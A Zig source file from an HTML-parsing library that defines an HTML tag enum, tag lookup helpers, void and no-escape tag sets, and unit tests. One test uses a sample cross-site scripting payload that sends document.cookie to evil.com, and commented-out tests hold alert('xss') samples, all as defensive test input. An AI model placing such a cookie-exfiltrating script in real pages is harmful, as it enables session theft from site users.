//! Enum optimized HTML Tags

const std = @import("std");
const z = @import("../zhtml.zig");

const testing = std.testing;
const print = std.debug.print;

/// [HtmlTag] Convert string to enum (inline) with fallback to string comparison for custom elements
///
/// (`Zig` code: std.meta.stringToCode` with a higher limit).
pub fn stringToEnum(comptime T: type, str: []const u8) ?T {
    if (@typeInfo(T).@"enum".fields.len <= 112) {
        const kvs = comptime build_kvs: {
            const EnumKV = struct { []const u8, T };
            var kvs_array: [@typeInfo(T).@"enum".fields.len]EnumKV = undefined;
            for (@typeInfo(T).@"enum".fields, 0..) |enumField, i| {
                kvs_array[i] = .{ enumField.name, @field(T, enumField.name) };
            }
            break :build_kvs kvs_array[0..];
        };
        const map = std.StaticStringMap(T).initComptime(kvs);
        return map.get(str);
    } else {
        inline for (@typeInfo(T).@"enum".fields) |enumField| {
            if (std.mem.eql(u8, str, enumField.name)) {
                return @field(T, enumField.name);
            }
        }
        return null;
    }
}

/// [HtmlTag] Convert qualified name (lowercase) to HtmlTag enum (inline)
pub inline fn parseTag(qualified_name: []const u8) ?HtmlTag {
    // Fast path: try direct enum lookup (most common case - lowercase)
    if (stringToEnum(HtmlTag, qualified_name)) |tag| {
        return tag;
    }

    // Handle case-insensitive lookup for uppercase tags
    var lowercase_buf: [64]u8 = undefined;
    if (qualified_name.len >= lowercase_buf.len) return null; // Tag name too long

    const lowercase_name = std.ascii.lowerString(lowercase_buf[0..qualified_name.len], qualified_name);
    if (stringToEnum(HtmlTag, lowercase_name)) |tag| {
        return tag;
    }

    // Handle namespaced elements: "svg:circle" -> null (not in our enum)
    if (std.mem.indexOf(u8, qualified_name, ":")) |_| {
        return null; // Namespaced elements not in standard HTML enum
    }

    return null; // Unknown/custom element
}

test "parseTag" {
    try testing.expect(parseTag("div") == .div);
    try testing.expect(parseTag("span") == .span);
    try testing.expect(parseTag("SPAN") == .span);
    try testing.expect(parseTag("unknown") == null);
}

/// [HtmlTag] Convert element to HtmlTag enum (inline)
pub fn tagFromElement(element: *z.HTMLElement) ?HtmlTag {
    const qualified_name = z.qualifiedName_zc(element);
    return parseTag(qualified_name);
}

/// [HtmlTag] Tag name matcher function
pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
    const tag = z.parseTag(z.qualifiedName_zc(element));
    return tag == parseTag(tag_name);
}

/// [HtmlTag] Enum that represents the various HTML tags.
///
///  `self.toString` returns the tag name as a string.
///
/// `self.isVoid` checks if the tag is a self-closing element (e.g., `<br>`, `<img>`).
///
///  `self.isNoEscape` checks if the tag should not have its content escaped.
///
///
///
pub const HtmlTag = enum {
    a,
    abbr,
    address,
    area,
    article,
    aside,
    audio,
    b,
    base,
    bdi,
    bdo,
    blockquote,
    body,
    br,
    button,
    canvas,
    caption,
    cite,
    code,
    col,
    colgroup,
    data,
    datalist,
    dd,
    del,
    details,
    dfn,
    dialog,
    div,
    dl,
    dt,
    em,
    embed,
    fieldset,
    figcaption,
    figure,
    footer,
    form,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    head,
    header,
    hgroup,
    hr,
    html,
    i,
    iframe,
    img,
    input,
    ins,
    kbd,
    label,
    legend,
    li,
    link,
    main,
    map,
    mark,
    menu,
    meta,
    meter,
    nav,
    noscript,
    object,
    ol,
    optgroup,
    option,
    output,
    p,
    picture,
    pre,
    progress,
    q,
    rp,
    rt,
    ruby,
    s,
    samp,
    script,
    section,
    select,
    slot,
    small,
    source,
    span,
    strong,
    style,
    sub,
    summary,
    sup,
    table,
    tbody,
    td,
    template,
    textarea,
    tfoot,
    th,
    thead,
    time,
    title,
    tr,
    track,
    u,
    ul,
    video,
    wbr,

    pub fn toString(self: @This()) []const u8 {
        return switch (self) {
            .a => "a",
            .abbr => "abbr",
            .address => "address",
            .area => "area",
            .article => "article",
            .aside => "aside",
            .audio => "audio",
            .b => "b",
            .base => "base",
            .bdi => "bdi",
            .bdo => "bdo",
            .blockquote => "blockquote",
            .body => "body",
            .br => "br",
            .button => "button",
            .canvas => "canvas",
            .caption => "caption",
            .cite => "cite",
            .code => "code",
            .col => "col",
            .colgroup => "colgroup",
            .data => "data",
            .datalist => "datalist",
            .dd => "dd",
            .del => "del",
            .details => "details",
            .dfn => "dfn",
            .dialog => "dialog",
            .div => "div",
            .dl => "dl",
            .dt => "dt",
            .em => "em",
            .embed => "embed",
            .fieldset => "fieldset",
            .figcaption => "figcaption",
            .figure => "figure",
            .footer => "footer",
            .form => "form",
            .h1 => "h1",
            .h2 => "h2",
            .h3 => "h3",
            .h4 => "h4",
            .h5 => "h5",
            .h6 => "h6",
            .head => "head",
            .header => "header",
            .hgroup => "hgroup",
            .hr => "hr",
            .html => "html",
            .i => "i",
            .iframe => "iframe",
            .img => "img",
            .input => "input",
            .ins => "ins",
            .kbd => "kbd",
            .label => "label",
            .legend => "legend",
            .li => "li",
            .link => "link",
            .main => "main",
            .map => "map",
            .mark => "mark",
            .menu => "menu",
            .meta => "meta",
            .meter => "meter",
            .nav => "nav",
            .noscript => "noscript",
            .object => "object",
            .ol => "ol",
            .optgroup => "optgroup",
            .option => "option",
            .output => "output",
            .p => "p",
            .picture => "picture",
            .pre => "pre",
            .progress => "progress",
            .q => "q",
            .rp => "rp",
            .rt => "rt",
            .ruby => "ruby",
            .s => "s",
            .samp => "samp",
            .script => "script",
            .section => "section",
            .select => "select",
            .slot => "slot",
            .small => "small",
            .source => "source",
            .span => "span",
            .strong => "strong",
            .style => "style",
            .sub => "sub",
            .summary => "summary",
            .sup => "sup",
            .table => "table",
            .tbody => "tbody",
            .td => "td",
            .template => "template",
            .textarea => "textarea",
            .tfoot => "tfoot",
            .th => "th",
            .thead => "thead",
            .time => "time",
            .title => "title",
            .tr => "tr",
            .track => "track",
            .u => "u",
            .ul => "ul",
            .video => "video",
            .wbr => "wbr",
        };
    }

    pub fn isVoid(self: HtmlTag) bool {
        return VoidTagSet.contains(self);
    }

    /// Check if this tag should not have its text content escaped
    pub fn isNoEscape(self: HtmlTag) bool {
        return NoEscapeTagSet.contains(self);
    }
};

/// [HtmlTag] Fragment parsing context - defines how the fragment should be interpreted
pub const FragmentContext = enum {
    /// Parse as if inside <body> (default for most cases)
    body,
    /// Parse as if inside <div> (for general content)
    div,
    /// Parse as if inside <template> (for web components)
    template,
    /// Parse as if inside <table> (for table rows/cells)
    table,
    tbody,
    tr,
    /// Parse as if inside <select> (for options)
    select,
    /// Parse as if inside <ul> (for list items)
    ul,
    /// Parse as if inside <ol> (for ordered list items)
    ol,
    /// Parse as if inside <dl> (for definition terms/descriptions)
    dl,
    /// Parse as if inside <fieldset> (for legend elements)
    fieldset,
    /// Parse as if inside <details> (for summary elements)
    details,
    /// Parse as if inside <optgroup> (for grouped options)
    optgroup,
    /// Parse as if inside <map> (for area elements)
    map,
    /// Parse as if inside <figure> (for img/figcaption elements)
    figure,
    /// Parse as if inside <form> (for input/label/button elements)
    form,
    /// Parse as if inside <video> (for source/track elements)
    video,
    /// Parse as if inside <audio> (for source/track elements)
    audio,
    /// Parse as if inside <picture> (for source/img elements)
    picture,
    /// Parse as if inside <head> (for meta tags, styles)
    head,
    /// Custom context element
    custom,
    /// Convert context enum to HTML tag name string
    /// Inlined for zero function call overhead in fragment parsing
    pub inline fn toTagName(self: FragmentContext) []const u8 {
        return switch (self) {
            .body => "body",
            .div => "div",
            .template => "template",
            .table => "table",
            .tbody => "tbody",
            .tr => "tr",
            .select => "select",
            .ul => "ul",
            .ol => "ol",
            .dl => "dl",
            .fieldset => "fieldset",
            .details => "details",
            .optgroup => "optgroup",
            .map => "map",
            .figure => "figure",
            .form => "form",
            .video => "video",
            .audio => "audio",
            .picture => "picture",
            .head => "head",
            .custom => "div", // fallback
        };
    }
    pub inline fn toTag(name: []const u8) ?FragmentContext {
        return stringToEnum(FragmentContext, name);
    }
};

test "FragmentContext" {
    // const doc = try z.createDocument();
    // defer z.destroyDocument(doc);
    // const fragment = try z.createDocumentFragment(doc);

    try testing.expectEqualStrings(FragmentContext.toTagName(.body), "body");
    try testing.expectEqualStrings(FragmentContext.toTagName(.table), "table");
    try testing.expect(FragmentContext.toTag("div").? == .div);
}

/// [HtmlTag] Set of void elements
pub const VoidTagSet = struct {
    /// Fast inline check if a tag is void
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .area, .base, .br, .col, .embed, .hr, .img, .input, .link, .meta, .source, .track, .wbr => true,
            else => false,
        };
    }
};

test "VoidTagSet" {
    try testing.expect(VoidTagSet.contains(.br));
    try testing.expect(VoidTagSet.contains(.img));
    try testing.expect(VoidTagSet.contains(.input));
    try testing.expect(!VoidTagSet.contains(.div));
}

/// [HtmlTag] Set of whitespace preserved elements
pub const WhitespacePreserveTagSet = struct {
    /// Fast inline check if a tag is whitespace preserved
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .pre, .textarea, .script, .style => true,
            .code => true,
            else => false,
        };
    }
};

test "whitespacepreservedTagSet" {
    const allocator = testing.allocator;

    const doc = try z.parseFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
    defer z.destroyDocument(doc);

    const body_elt = try z.bodyElement(doc);

    const expected = [_]struct { tag: z.HtmlTag, preserved: bool }{
        .{ .tag = .div, .preserved = false },
        .{ .tag = .pre, .preserved = true },
        .{ .tag = .code, .preserved = true },
        .{ .tag = .textarea, .preserved = true },
        .{ .tag = .script, .preserved = true },
        .{ .tag = .style, .preserved = true },
        .{ .tag = .p, .preserved = false },
    };

    const children_elts = try z.children(allocator, body_elt);
    defer allocator.free(children_elts);

    for (children_elts, 0..) |elt, i| {
        const tag = z.parseTag(z.qualifiedName_zc(elt)).?;
        try testing.expect(expected[i].tag == tag);
        try testing.expect(expected[i].preserved == WhitespacePreserveTagSet.contains(tag));
    }
}

/// [HtmlTag] Set of tags that should not be escaped (modern approach)
pub const NoEscapeTagSet = struct {
    /// Fast inline check if a tag should not be escaped
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .script, .style, .iframe => true,
            else => false,
        };
    }
};

/// [HtmlTag] Fast check if element should not have its content escaped (string-based)
///
/// Uses qualified name string and enum-based lookup for maximum performance.
/// For direct element checking without string allocation, use isNoEscapeElementFastZeroCopy().
///
/// Only standard tags get `isNoEscape = true` (`.script`, `.style`, `.iframe`).
///
/// If returns false, it means the element is not a no-escape element so it should be escaped.
/// ## Example
/// ```
/// <my-widget>User typed: <script>alert('xss')</script></my-widget>
/// // becomes
/// <my-widget>&lt;script&gt;alert('xss')&lt;/script&gt;</my-widget>
/// //
/// <script>console.log("hello");</script>  ← Must NOT escape
/// <style>body { color: red; }</style>     ← Must NOT escape
/// <iframe src="..."></iframe>             ← Must NOT escape
///---
pub fn isNoEscapeElement(element: *z.HTMLElement) bool {
    const tag = tagFromElement(element) orelse return false;
    return NoEscapeTagSet.contains(tag);
}

/// [HtmlTag] Fast check if element is void/self-closing (string-based)
///
/// Uses qualified name string and enum-based lookup for maximum performance.
/// For direct element checking without string allocation, use isVoidElementFastZeroCopy().
///
/// **Use when:** You already have the qualified name string
/// **Performance:** Fast (enum lookup), requires qualified name parameter
pub fn isVoidElement(qualified_name: []const u8) bool {
    const tag = parseTag(qualified_name) orelse return false;
    return VoidTagSet.contains(tag);
}

// /// [HtmlTag] ZERO-COPY void element check using lexbor's memory directly
// ///
// /// **Most performant version** - no allocation, direct from lexbor's memory
// ///
// /// **Use when:** You have the element object and need immediate checking
// /// **Performance:** Fastest (no string allocation), but element must be valid
// ///
// /// ```zig
// /// if (isVoidElementFastZeroCopy(element)) {
// ///     // Handle void element (like <br>, <img>)
// /// }
// /// ```
pub fn isVoidTag(tag: z.HtmlTag) bool {
    return VoidTagSet.contains(tag);
}

/// [HtmlTag] Extended check for no-escape elements including custom elements
///
/// Combines standard HTML5 tags with your custom no-escape tags.
///
/// **Use when:** You have web components that contain raw code (like code editors)
/// **Performance:** Fast for standard tags (enum), linear search for custom tags
///
/// ```zig
/// const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
/// if (isNoEscapeElementExtended(tag_name, &custom_no_escape)) {
///     // Don't escape content
/// }
/// ```
pub fn isNoEscapeElementExtended(element: *z.HTMLElement, custom_no_escape_tags: []const []const u8) bool {
    // First check standard HTML5 tags
    if (isNoEscapeElement(element)) {
        return true;
    }

    // Then check custom tags
    for (custom_no_escape_tags) |custom_tag| {
        if (std.mem.eql(u8, z.qualifiedName_zc(element), custom_tag)) {
            return true;
        }
    }

    return false;
}
// =================================================================
// === Tests ===

test "parseTag enum conversion" {
    // Test standard HTML tags
    try testing.expect(parseTag("div").? == HtmlTag.div);
    try testing.expect(parseTag("p").? == HtmlTag.p);
    try testing.expect(parseTag("script").? == HtmlTag.script);

    // Test custom elements
    try testing.expect(parseTag("custom-element") == null);
    try testing.expect(parseTag("my-widget") == null);

    // Test namespaced elements
    try testing.expect(parseTag("svg:circle") == null);
    try testing.expect(parseTag("math:equation") == null);
}

// test "custom elements and web components" {
//     // Standard HTML5 elements
//     try testing.expect(isVoidElementFast("br") == true);
//     try testing.expect(isNoEscapeElement("script") == true);

//     // Custom elements/Web components (safe defaults)
//     try testing.expect(isVoidElementFast("my-widget") == false); // Not void
//     try testing.expect(isNoEscapeElement("my-widget") == false); // DO escape (safer)
//     try testing.expect(isVoidElementFast("custom-button") == false);
//     try testing.expect(isNoEscapeElement("custom-button") == false);

//     // Web component naming conventions
//     try testing.expect(isVoidElementFast("x-calendar") == false);
//     try testing.expect(isNoEscapeElement("x-calendar") == false);

//     // Extended function with custom no-escape tags
//     const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
//     try testing.expect(isNoEscapeElementExtended("script", &custom_no_escape) == true); // Standard
//     try testing.expect(isNoEscapeElementExtended("code-editor", &custom_no_escape) == true); // Custom
//     try testing.expect(isNoEscapeElementExtended("my-widget", &custom_no_escape) == false); // Regular custom
// }

// test "FAST enum-based functions" {
//     // Test the FAST enum-based functions
//     try testing.expect(isVoidElementFast("br") == true);
//     try testing.expect(isVoidElementFast("img") == true);
//     try testing.expect(isVoidElementFast("div") == false);

//     try testing.expect(isNoEscapeElement("script") == true);
//     try testing.expect(isNoEscapeElement("style") == true);
//     try testing.expect(isNoEscapeElement("div") == false);

//     // Test case insensitivity
//     try testing.expect(isVoidElementFast("BR") == true);
//     try testing.expect(isVoidElementFast("IMG") == true);
//     try testing.expect(isNoEscapeElement("SCRIPT") == true);

//     // Fast version doesn't handle obsolete tags (returns false)
//     try testing.expect(isNoEscapeElement("xmp") == false); // Not in HTML5 enum
// }

// test "ZERO-COPY element functions" {
//     const doc = try z.createDocument();
//     defer z.destroyDocument(doc);

//     // Create test elements
//     const br_elem = try z.createElement(doc, "br");
//     const script_elem = try z.createElement(doc, "script");
//     const div_elem = try z.createElement(doc, "div");
//     const custom_elem = try z.createElement(doc, "my-widget");

//     // Test zero-copy void element checks
//     try testing.expect(isVoidElementFastZeroCopy(br_elem) == true);
//     try testing.expect(isVoidElementFastZeroCopy(div_elem) == false);
//     try testing.expect(isVoidElementFastZeroCopy(custom_elem) == false); // Custom elements are not void

//     // Test zero-copy no-escape checks
//     try testing.expect(isNoEscapeElement(script_elem) == true);
//     try testing.expect(isNoEscapeElement(div_elem) == false);
//     try testing.expect(isNoEscapeElement(custom_elem) == false); // Custom elements are escaped by default
// }

test "parseHtmlTag" {
    const good_tag = parseTag("div");
    try testing.expect(good_tag.? == HtmlTag.div);

    const custom_tag = parseTag("custom-element");
    try testing.expect(custom_tag == null);
}

test "isVoid tag" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    // Test all void tags
    const void_tags = [_]HtmlTag{ .area, .base, .br };

    for (void_tags) |tag| {
        try testing.expect(tag.isVoid());
    }

    const non_void_tags = [_]HtmlTag{ .div, .p, .span, .a };

    for (non_void_tags) |tag| {
        try testing.expect(!tag.isVoid());
    }
}

// test "isVoidElementFast with various tags" {
//     // Test the updated isVoidElementFast function
//     try testing.expect(isVoidElementFast("br") == true);
//     try testing.expect(isVoidElementFast("img") == true);
//     try testing.expect(isVoidElementFast("div") == false);
//     try testing.expect(isVoidElementFast("custom-element") == false);
//     try testing.expect(isVoidElementFast("BR") == true); // Case insensitive
//     try testing.expect(isVoidElementFast("IMG") == true);
// }
test "lexbor NODENAME and self.toString and parseTag and qualifiedName" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    // Test all enum variants work
    const tags = [_]z.HtmlTag{ .div, .p, .span, .a, .img, .br };

    for (tags) |tag| {
        const element = try z.createElementAttr(doc, tag.toString(), &.{});
        const node_name = z.nodeName_zc(z.elementToNode(element));
        const expected_name = tag.toString();

        // Note: DOM names are typically uppercase
        try testing.expect(std.ascii.eqlIgnoreCase(expected_name, node_name));

        const expected_tag = parseTag(z.qualifiedName_zc(element));
        try testing.expect(tag == expected_tag);
    }
}

// test "custom element with script content - security behavior" {
//     const allocator = testing.allocator;

//     // Parse the potentially dangerous HTML
//     const html = "<my-widget><script>alert('xss')</script></my-widget>";
//     const doc = try z.parseFromString(html);
//     defer z.destroyDocument(doc);

//     // Get the my-widget element
//     const body = try z.bodyElement(doc);
//     const body_node = z.elementToNode(body);
//     const my_widget_node = z.firstChild(body_node).?;
//     const my_widget = z.nodeToElement(my_widget_node).?;

//     // Verify it's a custom element (not in enum)
//     try testing.expectEqualStrings("my-widget", z.qualifiedName_zc(my_widget));
//     try testing.expect(parseTag("my-widget") == null); // Not in enum

//     // Check security defaults for custom elements
//     try testing.expect(isVoidElementFastZeroCopy(my_widget) == false); // Not void
//     try testing.expect(isNoEscapeElement(my_widget) == false); // SHOULD escape content

//     // Get the inner script element
//     const script_node = z.firstChild(z.elementToNode(my_widget)).?;
//     const script_element = z.nodeToElement(script_node).?;

//     // Verify the script element itself
//     try testing.expectEqualStrings("script", z.qualifiedName_zc(script_element));
//     try testing.expect(parseTag("script").? == HtmlTag.script); // IS in enum
//     try testing.expect(isNoEscapeElement(script_element) == true); // Script content should NOT be escaped

//     // Get the actual text content
//     const script_content = try z.textContent(allocator, script_node);
//     defer allocator.free(script_content);
//     try testing.expectEqualStrings("alert('xss')", script_content);

//     // ================================================================
//     // DEMONSTRATE THE COMPLETE SECURITY FLOW
//     // ================================================================

//     // Phase 1: HTML → DOM (already done above)
//     // ✅ Parsed successfully, scripts don't execute in Zig

//     // Phase 2: Optional DOM normalization (simulate with cleaner-like behavior)
//     // ✅ Structure is fine, no normalization needed for this test

//     // Phase 3: DOM → HTML serialization (THE CRITICAL SECURITY PHASE)
//     // This is where your enum system provides security guidance:

//     // SAFE SERIALIZATION: Custom element content should be escaped
//     const my_widget_content = try z.textContent(allocator, z.elementToNode(my_widget));
//     defer allocator.free(my_widget_content);

//     // Simulate how a serializer would use your enum system for security:
//     if (isNoEscapeElement(my_widget) == false) {
//         // ✅ SAFE: Custom element content should be escaped when serializing
//         // This would turn: <script>alert('xss')</script>
//         // Into: &lt;script&gt;alert('xss')&lt;/script&gt;
//         try testing.expect(std.mem.indexOf(u8, my_widget_content, "alert('xss')") != null);
//         // Note: In real serialization, this content would be HTML-escaped
//     }

//     // FUNCTIONAL SERIALIZATION: Script element content should NOT be escaped
//     if (isNoEscapeElement(script_element) == true) {
//         // ✅ FUNCTIONAL: Script content needs raw JavaScript to work
//         // This preserves: alert('xss'); (so JavaScript can execute properly)
//         try testing.expect(std.mem.indexOf(u8, script_content, "alert('xss')") != null);
//     }

//     // ================================================================
//     // THE KEY INSIGHT: Context determines security
//     // ================================================================

//     // Same content "<script>alert('xss')</script>", different contexts:
//     // 1. Inside <my-widget>: ESCAPE (treat as text)     → Safe display
//     // 2. Inside <script>: DON'T ESCAPE (treat as code)  → Functional JavaScript

//     // Your enum system provides the context-aware security rules!

//     // SUMMARY:
//     // - DOM parsing: Safe in Zig (scripts don't execute)
//     // - DOM normalization: No escaping needed (already parsed)
//     // - DOM serialization: Critical security phase (use your enum guidance)
//     // - Browser consumption: Where the actual danger lies
// }

test "complete security flow - user input to browser output" {
    const allocator = testing.allocator;

    // ================================================================
    // REAL-WORLD SCENARIO: User submits dangerous content
    // ================================================================

    const user_submitted_html = "<my-custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script><p>Innocent content</p></my-custom-widget>";

    // Phase 1: Parse user content (safe in Zig server environment)
    const doc = try z.parseFromString(user_submitted_html);
    defer z.destroyDocument(doc);

    const body = try z.bodyElement(doc);
    const widget = z.firstChild(z.elementToNode(body)).?;
    const widget_element = z.nodeToElement(widget).?;

    // Verify we have a custom element
    try testing.expectEqualStrings("my-custom-widget", z.qualifiedName_zc(widget_element));
    try testing.expect(parseTag("my-custom-widget") == null); // Not in standard HTML enum

    // Phase 2: Check security guidance from your enum system
    const should_escape_widget = !isNoEscapeElement(widget_element);
    try testing.expect(should_escape_widget == true); // Custom elements should be escaped

    // Phase 3: Simulate safe serialization for browser output
    const widget_content = try z.textContent(allocator, widget);
    defer allocator.free(widget_content);

    // This content contains dangerous JavaScript
    try testing.expect(std.mem.indexOf(u8, widget_content, "document.cookie") != null);
    try testing.expect(std.mem.indexOf(u8, widget_content, "evil.com") != null);

    // ✅ SAFE OUTPUT: Because isNoEscape = false for custom elements,
    // a proper serializer would escape this content:
    //
    // DANGEROUS (raw):
    // <my-custom-widget><script>document.location='https://evil.com'</script></my-custom-widget>
    //
    // SAFE (escaped):
    // <my-custom-widget>&lt;script&gt;document.location='https://evil.com'&lt;/script&gt;</my-custom-widget>
    //
    // When sent to browser: JavaScript becomes harmless text!

    // Your enum system provides the critical security guidance:
    // - Standard HTML elements: Functional (scripts can execute)
    // - Custom elements: Safe (content gets escaped)
    // - Unknown elements: Safe by default (fallback to escaping)

    // This prevents XSS while maintaining HTML functionality! 🛡️
}
test "mixing enum and string creation" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    const div = try z.createElementAttr(
        doc,
        "div",
        &.{},
    );

    const custom = try z.createElementAttr(
        doc,
        "my-custom-element",
        &.{},
    );
    const web_component = try z.createElementAttr(
        doc,
        "x-widget",
        &.{},
    );

    try testing.expectEqualStrings("DIV", z.nodeName_zc(z.elementToNode(div)));
    try testing.expectEqualStrings("MY-CUSTOM-ELEMENT", z.nodeName_zc(z.elementToNode(custom)));
    try testing.expectEqualStrings("X-WIDGET", z.nodeName_zc(z.elementToNode(web_component)));
    try testing.expectEqualStrings("DIV", z.tagName_zc(div));
    try testing.expectEqualStrings("MY-CUSTOM-ELEMENT", z.tagName_zc(custom));
    try testing.expectEqualStrings("X-WIDGET", z.tagName_zc(web_component));

    // Test both allocation and zero-copy versions
    const allocator = testing.allocator;

    // Allocating version (safe for long-term storage)
    const qcustom = try z.qualifiedName(allocator, custom);
    defer allocator.free(qcustom);
    try testing.expectEqualStrings("my-custom-element", qcustom);

    const qdiv = try z.qualifiedName(allocator, div);
    defer allocator.free(qdiv);
    try testing.expectEqualStrings("div", qdiv);

    // Zero-copy version (fast, but only valid during element lifetime)
    const qcustom_borrowed = z.qualifiedName_zc(custom);
    const qdiv_borrowed = z.qualifiedName_zc(div);
    try testing.expectEqualStrings("my-custom-element", qcustom_borrowed);
    try testing.expectEqualStrings("div", qdiv_borrowed);
}
